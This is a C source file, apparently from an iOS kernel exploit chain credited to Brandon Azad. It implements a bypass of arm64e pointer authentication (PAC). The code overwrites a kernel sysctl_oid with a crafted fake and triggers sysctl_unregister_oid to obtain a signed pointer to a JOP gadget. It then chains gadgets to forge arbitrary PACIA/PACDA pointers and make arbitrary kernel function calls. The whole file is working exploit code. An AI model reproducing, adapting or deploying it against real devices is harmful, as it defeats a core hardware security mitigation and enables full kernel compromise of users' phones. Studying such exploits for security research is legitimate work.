/*
 * kernel_call/pac.c
 * Brandon Azad
 */
#include "pac.h"

#include "kernel_call.h"
#include "kc_parameters.h"
#include "user_client.h"
#include "kernel_memory.h"
#include "log.h"
#include "mach_vm.h"
#include "parameters.h"

#if __arm64e__

// ---- Global variables --------------------------------------------------------------------------

// The address of our kernel buffer.
static uint64_t kernel_pacxa_buffer;

// The forged value PACIZA('mov x0, x4 ; br x5').
static uint64_t paciza__mov_x0_x4__br_x5;

// ---- Stage 2 -----------------------------------------------------------------------------------

/*
 * stage1_kernel_call_7
 *
 * Description:
 * 	Call a kernel function using our stage 1 execute primitive with explicit registers.
 *
 * 	See stage1_kernel_call_7v.
 */
static uint32_t
stage1_kernel_call_7(uint64_t function, uint64_t x1, uint64_t x2, uint64_t x3,
		uint64_t x4, uint64_t x5, uint64_t x6) {
	uint64_t arguments[7] = { 1, x1, x2, x3, x4, x5, x6 };
	return stage1_kernel_call_7v(function, 7, arguments);
}

/*
 * stage1_init_kernel_pacxa_forging
 *
 * Description:
 * 	Initialize our stage 1 capability to forge PACIA and PACDA pointers.
 */
static void
stage1_init_kernel_pacxa_forging() {
	// Get the authorized pointers to l2tp_domain_module_start() and l2tp_domain_module_stop().
	// Because these values already contain the PACIZA code, we can call them with the stage 0
	// call primitive to start/stop the module.
	uint64_t paciza__l2tp_domain_module_start = kernel_read64(
			ADDRESS(paciza_pointer__l2tp_domain_module_start));
	uint64_t paciza__l2tp_domain_module_stop = kernel_read64(
			ADDRESS(paciza_pointer__l2tp_domain_module_stop));

	// Read out the original value of sysctl__net_ppp_l2tp__data.
	uint8_t sysctl__net_ppp_l2tp__data[SIZE(sysctl_oid)];
	kernel_read(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));

	// Create a fake sysctl_oid for sysctl_unregister_oid(). We craft this sysctl_oid such that
	// sysctl_unregister_oid() will execute the following instruction sequence:
	//
	// 	LDR         X10, [X9,#0x30]!		; X10 = old_oidp->oid_handler
	// 	CBNZ        X19, loc_FFFFFFF007EBD330
	// 	CBZ         X10, loc_FFFFFFF007EBD330
	// 	MOV         X19, #0
	// 	MOV         X11, X9			; X11 = &old_oidp->oid_handler
	// 	MOVK        X11, #0x14EF,LSL#48		; X11 = 14EF`&oid_handler
	// 	AUTIA       X10, X11			; X10 = AUTIA(handler, 14EF`&handler)
	// 	PACIZA      X10				; X10 = PACIZA(X10)
	// 	STR         X10, [X9]			; old_oidp->oid_handler = X10
	//
	uint8_t fake_sysctl_oid[SIZE(sysctl_oid)];
	memset(fake_sysctl_oid, 0xab, SIZE(sysctl_oid));
	FIELD(fake_sysctl_oid, sysctl_oid, oid_parent,  uint64_t) = ADDRESS(sysctl__net_ppp_l2tp) + OFFSET(sysctl_oid, oid_link);
	FIELD(fake_sysctl_oid, sysctl_oid, oid_link,    uint64_t) = ADDRESS(sysctl__net_ppp_l2tp);
	FIELD(fake_sysctl_oid, sysctl_oid, oid_kind,    uint32_t) = 0x400000;
	FIELD(fake_sysctl_oid, sysctl_oid, oid_handler, uint64_t) = ADDRESS(mov_x0_x4__br_x5);
	FIELD(fake_sysctl_oid, sysctl_oid, oid_version, uint32_t) = 1;
	FIELD(fake_sysctl_oid, sysctl_oid, oid_refcnt,  uint32_t) = 0;

	// Overwrite sysctl__net_ppp_l2tp with our fake sysctl_oid.
	kernel_write(ADDRESS(sysctl__net_ppp_l2tp), fake_sysctl_oid, SIZE(sysctl_oid));

	// Call l2tp_domain_module_stop() to trigger sysctl_unregister_oid() on our fake
	// sysctl_oid, which will PACIZA our pointer to the "mov x0, x4 ; br x5" gadget.
	__unused uint32_t ret;
	ret = stage1_kernel_call_7(
			paciza__l2tp_domain_module_stop,	// PC
			0, 0, 0, 0, 0, 0);			// X1 - X6
	DEBUG_TRACE(1, "%s(): 0x%08x; l2tp_domain_inited = %d",
			"l2tp_domain_module_stop", ret,
			kernel_read32(ADDRESS(l2tp_domain_inited)));

	// Read back the PACIZA'd pointer to the 'mov x0, x4 ; br x5' gadget. This pointer will not
	// be exactly correct, since it PACIZA'd an AUTIA'd pointer we didn't sign. But we can use
	// this value to reconstruct the correct PACIZA'd pointer.
	uint64_t handler = kernel_read64(
			ADDRESS(sysctl__net_ppp_l2tp) + OFFSET(sysctl_oid, oid_handler));
	paciza__mov_x0_x4__br_x5 = handler ^ (1uLL << (63 - 1));
	DEBUG_TRACE(1, "PACIZA(%s) = 0x%016llx", "'mov x0, x4 ; br x5'", paciza__mov_x0_x4__br_x5);

	// Now write back the original sysctl_oid and call sysctl_unregister_oid() to clean it up.
	kernel_write(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
	ret = stage1_kernel_call_7(
			paciza__mov_x0_x4__br_x5,	// PC
			0, 0, 0,			// X1 - X3
			ADDRESS(sysctl__net_ppp_l2tp),	// X4
			ADDRESS(sysctl_unregister_oid),	// X5
			0);				// X6
	DEBUG_TRACE(2, "%s(%016llx) = 0x%08x", "sysctl_unregister_oid",
			ADDRESS(sysctl__net_ppp_l2tp), ret);

	// And finally call l2tp_domain_module_start() to re-initialize the module.
	ret = stage1_kernel_call_7(
			paciza__l2tp_domain_module_start,	// PC
			0, 0, 0, 0, 0, 0);			// X1 - X6
	DEBUG_TRACE(1, "%s(): 0x%08x; l2tp_domain_inited = %d",
			"l2tp_domain_module_start", ret,
			kernel_read32(ADDRESS(l2tp_domain_inited)));

	// Alright, so now we have an arbitrary call gadget!
	kernel_pacxa_buffer = stage1_get_kernel_buffer();
}

// ---- Stage 2 -----------------------------------------------------------------------------------

/*
 * stage2_kernel_forge_pacxa
 *
 * Description:
 * 	Forge a PACIA or PACDA pointer using the kernel forging gadgets.
 */
static uint64_t
stage2_kernel_forge_pacxa(uint64_t address, uint64_t context, bool instruction) {
	const size_t pacxa_buffer_size   = SIZE(kernel_forge_pacxa_gadget_buffer);
	const size_t pacxa_buffer_offset = OFFSET(kernel_forge_pacxa_gadget_buffer, first_access);
	// Initialize the kernel_pacxa_buffer to be all zeros.
	uint8_t pacxa_buffer[pacxa_buffer_size - pacxa_buffer_offset];
	memset(pacxa_buffer, 0, sizeof(pacxa_buffer));
	kernel_write(kernel_pacxa_buffer, pacxa_buffer, sizeof(pacxa_buffer));
	// The buffer address we pass to the gadget is offset from the part of that we initialize
	// (to save us some space). The result is stored at different offsets in the buffer
	// depending on whether the operation is PACIA or PACDA.
	uint64_t buffer_address = kernel_pacxa_buffer - pacxa_buffer_offset;
	uint64_t result_address = buffer_address;
	uint64_t pacxa_gadget;
	if (instruction) {
		result_address += OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result);
		pacxa_gadget = ADDRESS(kernel_forge_pacia_gadget);
	} else {
		result_address += OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result);
		pacxa_gadget = ADDRESS(kernel_forge_pacda_gadget);
	}
	// We need to set:
	//
	// 	x2  = buffer_address
	// 	x9  = address
	// 	x10 = context
	//
	// In order to do that we'll execute the following JOP sequence before jumping to the
	// gadget:
	//
	// 	mov  x0, x4 ; br x5
	// 	mov  x9, x0 ; br x1
	// 	mov x10, x3 ; br x6
	//
	__unused uint32_t ret;
	ret = stage1_kernel_call_7(
			paciza__mov_x0_x4__br_x5,	// PC
			ADDRESS(mov_x10_x3__br_x6),	// X1
			buffer_address,			// X2
			context,			// X3
			address,			// X4
			ADDRESS(mov_x9_x0__br_x1),	// X5
			pacxa_gadget);			// X6
	DEBUG_TRACE(2, "%s_GADGET(): 0x%08x", (instruction ? "PACIA" : "PACDA"), ret);
	// Now recover the PACXA'd value.
	uint64_t pacxa = kernel_read64(result_address);
	return pacxa;
}

/*
 * xpaci
 *
 * Description:
 * 	Strip a PACIx code from a pointer.
 */
static uint64_t
xpaci(uint64_t pointer) {
	asm("xpaci %[value]\n" : [value] "+r"(pointer));
	return pointer;
}

/*
 * xpacd
 *
 * Description:
 * 	Strip a PACDx code from a pointer.
 */
static uint64_t
xpacd(uint64_t pointer) {
	asm("xpacd %[value]\n" : [value] "+r"(pointer));
	return pointer;
}

#endif // __arm64e__

// ---- API ---------------------------------------------------------------------------------------

bool
stage2_kernel_call_init() {
#if __arm64e__
	stage1_init_kernel_pacxa_forging();
#endif
	return true;
}

void
stage2_kernel_call_deinit() {
}

uint32_t
stage2_kernel_call_7v(uint64_t function,
		size_t argument_count, const uint64_t arguments[]) {
	uint64_t paciza_function = kernel_forge_pacia(function, 0);
	return stage1_kernel_call_7v(paciza_function, argument_count, arguments);
}

uint64_t
kernel_forge_pacia(uint64_t pointer, uint64_t context) {
#if __arm64e__
	return stage2_kernel_forge_pacxa(pointer, context, true);
#else
	return pointer;
#endif
}

uint64_t
kernel_forge_pacia_with_type(uint64_t pointer, uint64_t address, uint16_t type) {
	uint64_t context = ((uint64_t) type << 48) | (address & 0x0000ffffffffffff);
	return kernel_forge_pacia(pointer, context);
}

uint64_t
kernel_forge_pacda(uint64_t pointer, uint64_t context) {
#if __arm64e__
	return stage2_kernel_forge_pacxa(pointer, context, false);
#else
	return pointer;
#endif
}

uint64_t
kernel_xpaci(uint64_t pointer) {
#if __arm64e__
	return xpaci(pointer);
#else
	return pointer;
#endif
}

uint64_t
kernel_xpacd(uint64_t pointer) {
#if __arm64e__
	return xpacd(pointer);
#else
	return pointer;
#endif
}
